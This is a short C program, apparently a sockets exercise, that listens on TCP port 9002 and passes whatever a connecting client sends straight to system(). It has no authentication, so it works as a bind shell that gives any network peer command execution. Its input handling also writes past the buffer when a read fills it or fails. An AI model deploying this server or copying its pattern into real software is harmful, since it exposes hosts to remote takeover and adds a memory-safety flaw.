#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#define MAX 256
#include<string.h>

int main(){
    int server_socket,client_socket;
    server_socket=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in server_address,client_address;
    

    server_address.sin_addr.s_addr=INADDR_ANY;
    server_address.sin_family=PF_INET;
    server_address.sin_port=htons(9002);

    if(bind(server_socket,(struct sockaddr *) &server_address,sizeof(server_address))<0){
        printf("Could not bind\n");
        exit(0);
    }
    else{
        if ((listen(server_socket, 5)) != 0) { 
        printf("Listen failed\n"); 
        exit(0); 
    } 
    printf("Listening\n");

    socklen_t clilen=sizeof(client_address);
    client_socket=accept(server_socket,(struct sockaddr *) &client_address,&clilen);
    printf("accepted\n");

    char buff[MAX]; 
    int n; 

    while(1) { 
        bzero(buff, MAX); 
        int bytes=read(client_socket, buff, sizeof(buff)); 
        
        buff[bytes]='\0';
        // printf("Client says: %s\t Enter a message for client : ", buff); 

        if (strncmp(buff,"end",3) == 0) { 
            printf("Server Exiting...\n"); 
            close(client_socket);
            close(server_socket);
            break;
            
        }
        system(buff);
        

    } 
        
        
}
    
    
    return 0;
}
